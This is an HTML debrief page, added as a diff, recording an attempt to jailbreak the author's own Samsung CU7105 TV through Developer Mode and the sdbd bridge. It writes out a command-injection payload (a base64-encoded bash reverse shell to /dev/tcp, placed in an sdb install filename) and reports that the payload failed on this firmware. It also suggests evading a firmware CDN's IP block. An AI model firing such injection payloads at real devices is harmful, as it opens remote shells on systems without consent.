@@ -1,0 +1,361 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>TV Jailbreak Debrief — Samsung CU7105</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%230b0f14'/%3E%3Crect x='5' y='8' width='22' height='14' rx='2' fill='none' stroke='%233ddc97' stroke-width='2'/%3E%3Cpath d='M11 26h10' stroke='%233ddc97' stroke-width='2' stroke-linecap='round'/%3E%3Ccircle cx='16' cy='15' r='3' fill='%23ff5470'/%3E%3C/svg%3E">
+<style>
+:root{
+  --bg:#0b0f14; --panel:#11161d; --panel2:#0e131a; --line:#1e2833;
+  --ink:#e8eef4; --dim:#8fa1b3; --faint:#5a6b7d;
+  --green:#3ddc97; --red:#ff5470; --amber:#ffb648; --cyan:#4cc9f0; --violet:#b18cff;
+  --mono:ui-monospace,"SF Mono","Cascadia Code",Menlo,monospace;
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Helvetica,Arial,sans-serif;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);line-height:1.55;
+  background-image:radial-gradient(1200px 500px at 80% -10%,rgba(76,201,240,.06),transparent 60%),radial-gradient(900px 500px at 10% 110%,rgba(61,220,151,.05),transparent 60%)}
+.wrap{max-width:1080px;margin:0 auto;padding:40px 20px 80px}
+header.hero{border:1px solid var(--line);border-radius:16px;background:linear-gradient(180deg,var(--panel),var(--panel2));padding:32px;margin-bottom:28px;position:relative;overflow:hidden}
+.hero::after{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent 0 3px,rgba(255,255,255,.012) 3px 4px);pointer-events:none}
+.eyebrow{font-family:var(--mono);font-size:12px;letter-spacing:.18em;text-transform:uppercase;color:var(--green);margin:0 0 10px}
+h1{margin:0 0 8px;font-size:clamp(28px,4.5vw,44px);letter-spacing:-.02em}
+h1 .dim{color:var(--dim)}
+.sub{color:var(--dim);max-width:64ch;margin:0}
+.chips{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--mono);font-size:12px;color:var(--dim);border:1px solid var(--line);border-radius:999px;padding:5px 12px;background:rgba(255,255,255,.02)}
+.chip b{color:var(--ink);font-weight:600}
+section{margin-top:34px}
+h2{font-size:22px;letter-spacing:-.01em;margin:0 0 4px;display:flex;align-items:center;gap:10px}
+h2 .n{font-family:var(--mono);font-size:12px;color:var(--bg);background:var(--green);border-radius:6px;padding:2px 8px;font-weight:700}
+.lead{color:var(--dim);margin:0 0 16px;max-width:70ch}
+/* scorecard */
+.score{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px}
+.cell{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:14px 16px;display:flex;gap:12px;align-items:flex-start}
+.dot{width:10px;height:10px;border-radius:50%;margin-top:6px;flex:none}
+.dot.ok{background:var(--green);box-shadow:0 0 10px rgba(61,220,151,.7)}
+.dot.warn{background:var(--amber);box-shadow:0 0 10px rgba(255,182,72,.6)}
+.dot.no{background:var(--red);box-shadow:0 0 10px rgba(255,84,112,.6)}
+.cell h3{margin:0;font-size:14px}
+.cell p{margin:2px 0 0;font-size:12.5px;color:var(--dim);font-family:var(--mono)}
+/* timeline */
+.tl{position:relative;margin:8px 0 0 8px;padding:0 0 0 26px;border-left:2px solid var(--line)}
+.phase{position:relative;border:1px solid var(--line);background:var(--panel);border-radius:12px;margin-bottom:12px;overflow:hidden}
+.phase::before{content:"";position:absolute;left:-33px;top:20px;width:12px;height:12px;border-radius:50%;background:var(--bg);border:3px solid var(--dim)}
+.phase.ok::before{border-color:var(--green)}
+.phase.warn::before{border-color:var(--amber)}
+.phase button{all:unset;display:flex;width:100%;justify-content:space-between;align-items:center;gap:12px;cursor:pointer;padding:14px 16px}
+.phase button:focus-visible{outline:2px solid var(--cyan);outline-offset:2px}
+.phase .ph-title{font-weight:600;font-size:15px}
+.phase .ph-sub{font-family:var(--mono);font-size:12px;color:var(--faint);margin-top:2px}
+.status{font-family:var(--mono);font-size:11px;padding:3px 10px;border-radius:999px;white-space:nowrap}
+.status.ok{color:var(--green);background:rgba(61,220,151,.1);border:1px solid rgba(61,220,151,.3)}
+.status.warn{color:var(--amber);background:rgba(255,182,72,.1);border:1px solid rgba(255,182,72,.3)}
+.status.no{color:var(--red);background:rgba(255,84,112,.1);border:1px solid rgba(255,84,112,.3)}
+.phase .body{display:none;padding:0 16px 16px;color:var(--dim);font-size:14px}
+.phase[open] .body{display:block}
+.phase .body .cmd{font-family:var(--mono);font-size:12.5px;background:#070b0f;border:1px solid var(--line);border-radius:8px;padding:10px 12px;margin:10px 0;color:var(--ink);overflow-x:auto}
+.phase .body .cmd .ok{color:var(--green)}
+/* diagram */
+.diagram{border:1px solid var(--line);border-radius:12px;background:var(--panel2);padding:18px;overflow-x:auto}
+svg text{font-family:var(--mono)}
+/* port map */
+.ports{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px}
+.port{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:12px 14px;font-family:var(--mono);font-size:12.5px}
+.port .p{font-size:15px;font-weight:700;color:var(--ink)}
+.port .svc{color:var(--dim);margin:2px 0 6px}
+.port .st{font-size:11px;padding:2px 8px;border-radius:999px}
+.port.open .st{color:var(--green);background:rgba(61,220,151,.1)}
+.port.closed .st{color:var(--faint);background:rgba(255,255,255,.04)}
+.port .note{color:var(--faint);font-size:11px;margin-top:8px;font-family:var(--sans)}
+/* exploit */
+.exploit{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:18px}
+.code{font-family:var(--mono);font-size:13px;background:#070b0f;border:1px solid var(--line);border-radius:8px;padding:14px;overflow-x:auto;white-space:pre;color:var(--dim)}
+.code .g{color:var(--green)} .code .r{color:var(--red)} .code .c{color:var(--cyan)} .code .a{color:var(--amber)}
+.legend{display:flex;flex-wrap:wrap;gap:14px;margin-top:12px;font-family:var(--mono);font-size:12px;color:var(--dim)}
+.legend i{display:inline-block;width:10px;height:10px;border-radius:3px;margin-right:6px}
+table{width:100%;border-collapse:collapse;font-size:13.5px}
+th{font-family:var(--mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--faint);text-align:left;padding:8px 10px;border-bottom:1px solid var(--line)}
+td{padding:10px;border-bottom:1px solid var(--line);color:var(--dim);vertical-align:top}
+td b{color:var(--ink);font-weight:600}
+td .tag{font-family:var(--mono);font-size:11px;padding:2px 8px;border-radius:999px}
+.tag.ok{color:var(--green);background:rgba(61,220,151,.1)}
+.tag.warn{color:var(--amber);background:rgba(255,182,72,.1)}
+.tag.no{color:var(--red);background:rgba(255,84,112,.1)}
+footer{margin-top:48px;padding-top:20px;border-top:1px solid var(--line);color:var(--faint);font-size:12.5px;font-family:var(--mono)}
+@media (prefers-reduced-motion: reduce){html{scroll-behavior:auto} *{transition:none!important;animation:none!important}}
+@media (max-width:560px){ .wrap{padding:24px 14px 60px} .hero{padding:22px} }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="hero">
+  <p class="eyebrow">Mission debrief · Oct 14–15, 2026</p>
+  <h1>The TV <span class="dim">wasn't the wall.</span><br>The boot cycle was.</h1>
+  <p class="sub">A 48-hour hunt to break a Samsung CU7105 open — from “can you press a button?”
+  to a live <b>sdbd</b> connection, a named CVE on the table, and the disassembler
+  warmed up for the firmware itself.</p>
+  <div class="chips">
+    <span class="chip">TV <b>192.168.1.119</b> · CU7105 55 · Tizen 6 (platform 9.0)</span>
+    <span class="chip">DUID <b>U7CLIM2YTMUHE</b></span>
+    <span class="chip">Mac <b>192.168.1.7</b> · Apple M5</span>
+    <span class="chip">CVE on table <b>SVE-2025-50109</b></span>
+  </div>
+</header>
+
+<section aria-labelledby="scorecard">
+  <h2 id="scorecard">Scorecard</h2>
+  <p class="lead">What actually works on the box today, measured — not hoped for.</p>
+  <div class="score">
+    <div class="cell"><span class="dot ok"></span><div><h3>Network remote</h3><p>keys · volume · apps — permanent</p></div></div>
+    <div class="cell"><span class="dot ok"></span><div><h3>Developer Mode</h3><p>on, IP set, survives reboots</p></div></div>
+    <div class="cell"><span class="dot ok"></span><div><h3>sdbd daemon up</h3><p>port 26101 open after cold boot</p></div></div>
+    <div class="cell"><span class="dot ok"></span><div><h3>sdb connected</h3><p>2 client generations verified</p></div></div>
+    <div class="cell"><span class="dot warn"></span><div><h3>OS shell</h3><p>shell:0 is a stub on 2021 sets</p></div></div>
+    <div class="cell"><span class="dot no"></span><div><h3>Firmware in hand</h3><p>CDN 403s datacenter IPs</p></div></div>
+  </div>
+</section>
+
+<section aria-labelledby="timeline">
+  <h2 id="timeline"><span class="n">01</span>The timeline, phase by phase</h2>
+  <p class="lead">Click a phase to open it. Every command shown was run on the real machine.</p>
+  <div class="tl" id="phases">
+
+    <div class="phase ok" id="ph1">
+      <button aria-expanded="false"><span><span class="ph-title">Phase 0 — Earn the right to talk</span>
+      <span class="ph-sub">Control 2.0 pairing over wss://8002</span></span><span class="status ok">working</span></button>
+      <div class="body">
+        <p>Samsung's official “remote over the network” API. We paired from the Mac,
+        captured a PIN the TV printed, and stored the bearer token (it survives reboots).</p>
+        <div class="cmd">wss://192.168.1.119:8002/api/v2/channels/samsung.remote.control?name=U2Ftc3VuZ1JlbW90ZUFwcA==
+{"event":"req","id":"pairing","data":"pairing"} → PIN on TV
+{"event":"req","id":"pairing","data":"&lt;PIN&gt;"}   → <span class="ok">bearer token → token.txt</span></div>
+        <p>Hard-won gotchas: the TV drops keys sent before its <code>ms.channel.connect</code> ack;
+        and key names lie per generation — <code>KEY_VOLUMEUP</code> is a ghost, <code>KEY_VOLUP</code> is real.
+        Both fixed in <code>remote.js</code>. Verified live: volume 7 → 10, mute toggle.</p>
+      </div>
+    </div>
+
+    <div class="phase ok" id="ph2">
+      <button aria-expanded="false"><span><span class="ph-title">Phase 1 — The 123-12345 ritual</span>
+      <span class="ph-sub">unlocking Developer Mode, the way it's hidden</span></span><span class="status ok">unlocked</span></button>
+      <div class="body">
+        <p>No menu toggle exists on this model. The real path, found by trial and confirmed against
+        Samsung docs: <b>Home → Apps → “App Settings” (bottom of the apps panel) → press the
+        <code>123</code> button on the remote → type <code>12345</code> on the on-screen keypad.</b></p>
+        <p>The dialog has exactly one toggle and one IP field — the <em>development computer's</em> IP
+        (the Mac, <code>192.168.1.7</code>). No Reconnect button, no SSH/TSS checkboxes.
+        API-verified: <code>developerMode: "1"</code>, <code>developerIP: "192.168.1.7"</code>.</p>
+      </div>
+    </div>
+
+    <div class="phase warn" id="ph3">
+      <button aria-expanded="false"><span><span class="ph-title">Phase 2 — The sdbd mystery</span>
+      <span class="ph-sub">dev mode on, IP right, every port closed</span></span><span class="status warn">stuck</span></button>
+      <div class="body">
+        <p>An evening of everything that should have worked and didn't:</p>
+        <div class="cmd">raw sdb 1.0.0 connect 26101          → unable to connect
+tss-1.0 UDP → TV:49001 (5 payloads)  → no reply
+TSS server on MAC :49001, TV cycled  → TV never greets
+host sdbd :26099 + connect           → TV never dials in
+full port scan, dev mode on          → only 8080 open</div>
+        <p>Verdict at the wall: the protocol was fine (our own macOS build of sdb proved it).
+        The TV simply had <b>no daemon to talk to</b>.</p>
+      </div>
+    </div>
+
+    <div class="phase ok" id="ph4">
+      <button aria-expanded="false"><span><span class="ph-title">Phase 3 — The exploit that worked: a cold boot</span>
+      <span class="ph-sub">30 seconds on the wall socket</span></span><span class="status ok">door open</span></button>
+      <div class="body">
+        <p>The scout's 2026 research found the diagnosis, and it fits <em>every</em> symptom:</p>
+        <div class="cmd">sdbd snapshots the developer IP <span class="g">only at true boot</span>.
+Standby is not a boot.  (community record, 2020–2025 branded sets)
+
+<span class="a">$ unplug 30s → plug in → power on</span>
+$ nc -z -w 2 192.168.1.119 26101
+<span class="ok">26101 OPEN</span>
+$ sdb devices
+192.168.1.119:26101  device</div>
+        <p>No CVE, no payload. Every “reboot” we'd tried was a <code>KEY_POWER</code> (standby).
+        The TV had never booted with the IP already committed. That one unplug did what every
+        handshake, daemon and retry could not.</p>
+      </div>
+    </div>
+
+    <div class="phase warn" id="ph5">
+      <button aria-expanded="false"><span><span class="ph-title">Phase 4 — SVE-2025-50109 vs the 2021 stubs</span>
+      <span class="ph-sub">a named CVE, fired, and the firmware's answer</span></span><span class="status warn">blocked</span></button>
+      <div class="body">
+        <p>Bishop Fox (Feb 2026): <b>SVE-2025-50109</b> — command injection in sdbd's
+        <code>vd_appinstall</code>: the .tpk <em>filename</em> passes through a device-side
+        <code>system()</code>. Demonstrated on a 2020 TU-series and a 2022 CU-7000 — our family.</p>
+        <div class="cmd">sdb install "new$(echo &lt;b64: bash -i >&amp; /dev/tcp/192.168.1.7/PORT 0>&amp;1 | base64 -d | bash).tpk"
+<span class="g">→ device shell expands $(…) before install even starts</span></div>
+        <p>We fired it through two client generations. It was accepted without error… and no shell came home.
+        The timing test exposed why:</p>
+        <div class="cmd">exec('shell:0 sleep 5 &amp;&amp; echo SLEPT')  → returned in <span class="r">6ms</span>, empty</div>
+        <p><b><code>shell:0</code> is a no-op stub on this firmware.</b> Only sdbd builtins answer
+        (<code>getduid</code> → our real DUID; <code>uname</code>/<code>ls</code>/pulls → empty).
+        Next move: decompile <code>sdbd</code> and read the gate with our own eyes.</p>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<section aria-labelledby="anatomy">
+  <h2 id="anatomy"><span class="n">02</span>How it works — the anatomy of the door</h2>
+  <p class="lead">A Tizen TV is a Linux box with a UI bolted on. Every firmware ships a development
+  bridge (<b>sdbd</b>); Samsung just doesn't start it unless Developer Mode is fully satisfied.</p>
+  <div class="diagram" role="img" aria-label="Diagram: Mac talks to TV over Control 2.0 (always) and sdbd (only after cold boot); sdbd's services are partially stubbed on 2021 firmware">
+    <svg viewBox="0 0 960 420" width="100%" style="min-width:640px">
+      <defs>
+        <marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="#4cc9f0"/></marker>
+        <marker id="arrg" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="#3ddc97"/></marker>
+        <marker id="arra" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="#ffb648"/></marker>
+      </defs>
+      <!-- MAC -->
+      <rect x="20" y="60" width="240" height="300" rx="12" fill="#11161d" stroke="#1e2833" stroke-width="1.5"/>
+      <text x="40" y="92" fill="#e8eef4" font-size="15" font-weight="700">THE MAC</text>
+      <text x="40" y="110" fill="#5a6b7d" font-size="11">192.168.1.7 · Apple M5</text>
+      <rect x="36" y="126" width="208" height="44" rx="8" fill="#070b0f" stroke="#1e2833"/>
+      <text x="48" y="145" fill="#4cc9f0" font-size="12">remote.js</text>
+      <text x="48" y="160" fill="#5a6b7d" font-size="10">keys · volume · apps</text>
+      <rect x="36" y="180" width="208" height="44" rx="8" fill="#070b0f" stroke="#1e2833"/>
+      <text x="48" y="199" fill="#4cc9f0" font-size="12">sdb (ours, 2015) + thb (2026)</text>
+      <text x="48" y="214" fill="#5a6b7d" font-size="10">sdbd protocol clients</text>
+      <rect x="36" y="234" width="208" height="44" rx="8" fill="#070b0f" stroke="#1e2833"/>
+      <text x="48" y="253" fill="#b18cff" font-size="12">REA + Ghidra 12.1.4</text>
+      <text x="48" y="268" fill="#5a6b7d" font-size="10">waiting for sdbd binary</text>
+      <rect x="36" y="288" width="208" height="52" rx="8" fill="#0a1210" stroke="#3ddc97" stroke-opacity=".35"/>
+      <text x="48" y="308" fill="#3ddc97" font-size="12">token.txt</text>
+      <text x="48" y="323" fill="#5a6b7d" font-size="10">pairing token · survives reboots</text>
+      <!-- TV -->
+      <rect x="470" y="30" width="470" height="360" rx="14" fill="#0e131a" stroke="#1e2833" stroke-width="1.5"/>
+      <text x="490" y="62" fill="#e8eef4" font-size="15" font-weight="700">SAMSUNG CU7105 · TIZEN 6</text>
+      <text x="490" y="80" fill="#5a6b7d" font-size="11">192.168.1.119 · DUID U7CLIM2YTMUHE</text>
+      <!-- control api -->
+      <rect x="486" y="96" width="212" height="64" rx="8" fill="#0a1210" stroke="#3ddc97" stroke-opacity=".5"/>
+      <text x="498" y="118" fill="#3ddc97" font-size="12.5">Control 2.0 · wss:8002</text>
+      <text x="498" y="136" fill="#5a6b7d" font-size="10.5">always on · paired ✅</text>
+      <text x="498" y="150" fill="#5a6b7d" font-size="10.5">keys verified (7→10, mute)</text>
+      <!-- sdbd -->
+      <rect x="486" y="176" width="212" height="120" rx="8" fill="#101720" stroke="#4cc9f0" stroke-opacity=".55"/>
+      <text x="498" y="198" fill="#4cc9f0" font-size="12.5">sdbd daemon · tcp:26101</text>
+      <text x="498" y="216" fill="#5a6b7d" font-size="10.5">reads dev IP ONLY at boot</text>
+      <text x="498" y="230" fill="#3ddc97" font-size="10.5">cold boot → LISTENING ✅</text>
+      <text x="498" y="252" fill="#8fa1b3" font-size="10.5">getduid        ✅ builtin</text>
+      <text x="498" y="268" fill="#ffb648" font-size="10.5">shell:0        ⚠ stub (6ms)</text>
+      <text x="498" y="284" fill="#ffb648" font-size="10.5">appinstall     ⚠ accepts, exec?</text>
+      <!-- the rest -->
+      <rect x="714" y="176" width="212" height="120" rx="8" fill="#0e131a" stroke="#1e2833"/>
+      <text x="726" y="198" fill="#8fa1b3" font-size="12.5">the rest of Linux</text>
+      <text x="726" y="218" fill="#5a6b7d" font-size="10.5">/usr/sbin · init · store · ads</text>
+      <text x="726" y="244" fill="#b18cff" font-size="10.5">sdbd binary → REA</text>
+      <text x="726" y="260" fill="#5a6b7d" font-size="10.5">blocked: FOTA CDN 403</text>
+      <text x="726" y="280" fill="#5a6b7d" font-size="10.5">next: decompile the gate</text>
+      <!-- ports row -->
+      <text x="490" y="326" fill="#5a6b7d" font-size="10.5">8002 ✅  8001 ✅  8080 ✅  26101 ✅*  10022 ✗  49001 ✗   (*after cold boot only)</text>
+      <text x="490" y="368" fill="#5a6b7d" font-size="10.5">AirPlay 7000 · legacy 8080 · sdbd 26101 · ssh 10022 (never) · TSS 49001 (never)</text>
+      <!-- arrows -->
+      <path d="M260 148 C 360 148, 380 128, 482 128" stroke="#3ddc97" stroke-width="2" fill="none" marker-end="url(#arrg)"/>
+      <text x="330" y="122" fill="#3ddc97" font-size="10.5">bearer token</text>
+      <path d="M260 202 C 360 202, 380 232, 482 232" stroke="#4cc9f0" stroke-width="2" fill="none" marker-end="url(#arr)"/>
+      <text x="318" y="222" fill="#4cc9f0" font-size="10.5">tcp 26101 (1 client at a time!)</text>
+      <path d="M244 256 C 340 320, 480 380, 819 300" stroke="#b18cff" stroke-width="1.6" stroke-dasharray="5 5" fill="none" marker-end="url(#arr)"/>
+      <text x="500" y="398" fill="#b18cff" font-size="10.5">future: firmware → sdbd → rea decompile → read the exec gate</text>
+      <path d="M698 236 L 712 236" stroke="#ffb648" stroke-width="2" marker-end="url(#arra)"/>
+    </svg>
+  </div>
+</section>
+
+<section aria-labelledby="ports">
+  <h2 id="ports"><span class="n">03</span>The port map, as measured</h2>
+  <p class="lead">Every state below is a real <code>nc -z</code> result, not a doc quote.</p>
+  <div class="ports">
+    <div class="port open"><div class="p">8002</div><div class="svc">Control 2.0 · TLS</div><span class="st">open, always</span><div class="note">our remote rides here</div></div>
+    <div class="port open"><div class="p">26101</div><div class="svc">sdbd daemon</div><span class="st">open — after cold boot</span><div class="note">the jailbreak door</div></div>
+    <div class="port open"><div class="p">8001 / 8080</div><div class="svc">Control 2.0 plain / legacy</div><span class="st">open</span><div class="note">backup channels</div></div>
+    <div class="port closed"><div class="p">10022</div><div class="svc">dev SSH</div><span class="st">never opened</span><div class="note">not started by this firmware</div></div>
+    <div class="port closed"><div class="p">49001</div><div class="svc">TSS (both directions)</div><span class="st">silent</span><div class="note">tested from TV side and Mac side</div></div>
+  </div>
+</section>
+
+<section aria-labelledby="exploit">
+  <h2 id="exploit"><span class="n">04</span>The CVE, exploded</h2>
+  <p class="lead">SVE-2025-50109 in one line: <b>the .tpk filename argument is fed to a device-side
+  <code>system()</code></b>. A path containing <code>$(cmd)</code> executes on the TV before the
+  installer even checks the file.</p>
+  <div class="exploit">
+    <div class="code"><span class="c">$ sdb install </span>"new<span class="r">$(</span>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNy80OTA4OCAwPiYx
+  <span class="r">|</span> base64 -d <span class="r">|</span> bash<span class="r">)</span>.tpk"
+   <span class="g">└── base64 of:  bash -i >&amp; /dev/tcp/192.168.1.7/49088 0>&amp;1  ──┘</span>
+
+<span class="a">1. TV shell expands $( … )  →  bash -i runs on the TV</span>
+<span class="a">2. bash -i dials the Mac at 192.168.1.7:49088</span>
+<span class="a">3. the interactive prompt lands in our nc listener  →  OS shell</span></div>
+    <div class="legend">
+      <span><i style="background:var(--cyan)"></i>command</span>
+      <span><i style="background:var(--red)"></i>the injection vector</span>
+      <span><i style="background:var(--green)"></i>what it decodes to</span>
+      <span><i style="background:var(--amber)"></i>execution order on the TV</span>
+    </div>
+  </div>
+  <p class="lead" style="margin-top:16px">Why it didn't land on <em>our</em> set: the same firmware that
+  stubs <code>shell:0</code> (a 5-second sleep returned in <b>6ms</b>) likely trims the exec path too.
+  The proof will come from decompiling <code>sdbd</code> — which is exactly what REA + Ghidra are for,
+  and why the firmware is the final missing piece.</p>
+</section>
+
+<section aria-labelledby="arsenal">
+  <h2 id="arsenal"><span class="n">05</span>The arsenal, as left on the desk</h2>
+  <p class="lead">Everything below lives in <code>~/github/tv-remote</code> and survives reboots.</p>
+  <table>
+    <thead><tr><th>Tool</th><th>What it is</th><th>Status</th></tr></thead>
+    <tbody>
+      <tr><td><b>remote.js</b> + token.txt</td><td>Control 2.0 key remote with handshake wait and key-alias table. One sentence drives the TV.</td><td><span class="tag ok">permanent</span></td></tr>
+      <tr><td><b>sdb/sdb</b> (+ sdb/src)</td><td>sdb client 1.0.0 we compiled for macOS from Tizen source (patched).</td><td><span class="tag ok">connects</span></td></tr>
+      <tr><td><b>tizen-homebrew client</b> (2026)</td><td>Modern sdb client, <code>shell:0</code> protocol. Connects, returns real DUID.</td><td><span class="tag ok">verified</span></td></tr>
+      <tr><td><b>REA + Ghidra 12.1.4</b></td><td>The disassembler. Proven on a real ELF — decompiled to <code>int main(){return 42;}</code>.</td><td><span class="tag ok">armed</span></td></tr>
+      <tr><td><b>firmware pipeline</b></td><td>sfd/samfirm → .tar.zst → squashfs → sdbd binary → REA.</td><td><span class="tag no">CDN 403</span></td></tr>
+    </tbody>
+  </table>
+</section>
+
+<section aria-labelledby="next">
+  <h2 id="next"><span class="n">06</span>What success looks like next</h2>
+  <table>
+    <thead><tr><th>#</th><th>Move</th><th>Why it wins</th></tr></thead>
+    <tbody>
+      <tr><td>1</td><td><b>Firmware in, sdbd out</b> — download from a residential IP (phone hotspot) or grab a pre-extracted CU7105 rootfs.</td><td>CDN 403s datacenter IPs; a home IP won't be flagged.</td></tr>
+      <tr><td>2</td><td><b><code>rea decompile sdbd</code></b> — find the exact exec gate: where appinstall calls system(), and what the 2021 build stubs.</td><td>Reads the answer from Samsung's own code instead of the internet's guesses.</td></tr>
+      <tr><td>3</td><td><b>Shell → sideload</b> — if the exec path exists: <code>whoami</code> → <code>sdk</code>, then TizenBrew: ad-free YouTube, Jellyfin, our own apps, ad channels killed.</td><td>That's the whole prize tier in one unlock.</td></tr>
+      <tr><td>4</td><td><b>If branded builds truly stub it</b> — the exploit stays THE capability unlock for the modern fleet, and our set keeps a working remote with the door armed for the next firmware update.</td><td>Even a no is a documented, measured no.</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<footer>
+  samsung-tv-remote · debrief generated 2026-10-15 · companion doc: JAILBREAK.md in the same repo ·
+  the TV is in standby, the door is armed, the disassembler is warm.
+</footer>
+
+</div>
+<script>
+document.querySelectorAll('.phase button').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const phase = btn.closest('.phase');
+    const open = phase.hasAttribute('open');
+    phase.hasAttribute('open') ? phase.removeAttribute('open') : phase.setAttribute('open','');
+    btn.setAttribute('aria-expanded', String(!open));
+  });
+});
+// open the first two by default so the page is useful on first paint
+['ph1','ph4'].forEach(id => { const p = document.getElementById(id); if (p){ p.setAttribute('open',''); p.querySelector('button').setAttribute('aria-expanded','true'); } });
+</script>
+</body>
+</html>
